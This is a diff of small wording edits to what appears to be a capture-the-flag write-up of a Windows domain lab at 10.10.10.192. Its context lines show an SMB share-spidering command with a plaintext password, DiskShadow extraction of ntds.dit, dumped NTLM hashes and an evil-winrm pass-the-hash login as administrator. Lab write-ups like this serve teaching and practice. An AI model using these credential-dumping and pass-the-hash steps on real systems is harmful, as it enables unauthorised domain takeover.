@@ -200,7 +200,7 @@ nxc smb 10.10.10.192 -u audit2020 -p 'newP@ssword2025' --share forensic -M spide
 {
 ```
 
-Out of all the files, the lsass sounds very interesting to me as it's in a file called `memory_analysis` so this could be a dump of the lsass.
+Out of all the files, the lsass sounds very interesting to me as it's in a folder called `memory_analysis` so this could be a dump of the lsass.
 
 ### LSASS
 
@@ -327,7 +327,7 @@ PS: Because the audit report is sensitive, I have encrypted it on the desktop (r
 
 Since we couldn't find anything on sam, let's get ntds.dit file instead.
 
-### Shadow disk attack
+### DiskShadow
 
 First, let's run the following commands to create text file with the necessary commands that will be used by diskshadow.exe to create a shadow disk
 
@@ -413,7 +413,7 @@ audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa
 support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
 ```
 
-We got the administrator's hash, let's login.
+We got the administrator's hash, let's get a shell.
 
 ```terminal
 [★]$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
@@ -426,7 +426,6 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> 
-
 ```
 
 ---
